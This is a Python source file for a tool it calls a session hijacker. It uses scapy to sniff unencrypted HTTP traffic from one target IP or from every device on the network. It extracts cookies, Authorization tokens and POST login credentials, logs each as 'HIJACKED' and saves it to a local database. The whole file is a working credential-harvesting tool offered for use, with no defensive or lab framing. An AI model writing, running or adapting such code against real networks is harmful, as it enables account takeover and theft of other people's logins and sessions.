"""
Session Hijacker — Credential & Cookie Sniffer
==============================================
Intercepts and extracts sensitive authentication tokens, session cookies,
and login credentials from unencrypted HTTP traffic.

Usage:
    sudo PYTHONPATH=. .venv/bin/python3 -m radar.fingerprint.hijacker <target_ip>
"""

import sys
import logging
from scapy.all import sniff, IP, TCP, Raw
from radar.database.vault import Vault

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(message)s")
logger = logging.getLogger("hijacker")

class SessionHijacker:
    def __init__(self, target_ip: str = None):
        self.target_ip = target_ip
        self.vault = Vault()
        self.captured_count = 0

    def _process_packet(self, pkt):
        """Analyzes a packet for sensitive HTTP headers."""
        if not pkt.haslayer(Raw):
            return

        try:
            payload = pkt[Raw].load.decode(errors='ignore')
            
            # We only care about HTTP headers
            if "HTTP" not in payload:
                return

            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            
            # Identify Host
            host = "Unknown"
            for line in payload.splitlines():
                if line.lower().startswith("host:"):
                    host = line.split(":", 1)[1].strip()
                    break

            # 1. Look for Cookies
            if "Cookie:" in payload:
                for line in payload.splitlines():
                    if line.lower().startswith("cookie:"):
                        cookie_val = line.split(":", 1)[1].strip()
                        self._report_cred(src_ip, host, "Cookie", cookie_val, line)

            # 2. Look for Authorization Headers
            if "Authorization:" in payload:
                for line in payload.splitlines():
                    if line.lower().startswith("authorization:"):
                        auth_val = line.split(":", 1)[1].strip()
                        self._report_cred(src_ip, host, "Auth-Token", auth_val, line)

            # 3. Look for POST data credentials (very basic)
            if "user=" in payload.lower() or "pass=" in payload.lower() or "pwd=" in payload.lower():
                # Usually at the end of the payload after headers
                body = payload.split("\\r\\n\\r\\n")[-1]
                if body:
                    self._report_cred(src_ip, host, "POST-Data", body, "Raw POST Body")

        except Exception as e:
            # logger.debug(f"Error parsing packet: {e}")
            pass

    def _report_cred(self, ip, host, c_type, value, raw):
        """Logs the credential and saves it to the database."""
        # Simple deduplication (don't log the same value twice in one run)
        logger.info(f"\\n[!] HIJACKED {c_type} from {ip}")
        logger.info(f"    Host: {host}")
        logger.info(f"    Value: {value[:100]}...")
        
        self.vault.insert_credential(ip, host, c_type, value, raw)
        self.captured_count += 1

    def start(self):
        """Starts the sniffer."""
        filter_str = f"tcp port 80"
        if self.target_ip:
            filter_str += f" and host {self.target_ip}"
            logger.info(f"📡 Harvesting sessions for {self.target_ip}...")
        else:
            logger.info("📡 Harvesting sessions for ALL devices...")

        try:
            sniff(filter=filter_str, prn=self._process_packet, store=0)
        except KeyboardInterrupt:
            logger.info(f"\\nStopping harvester. Total credentials captured: {self.captured_count}")
            sys.exit(0)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    hijacker = SessionHijacker(target)
    hijacker.start()
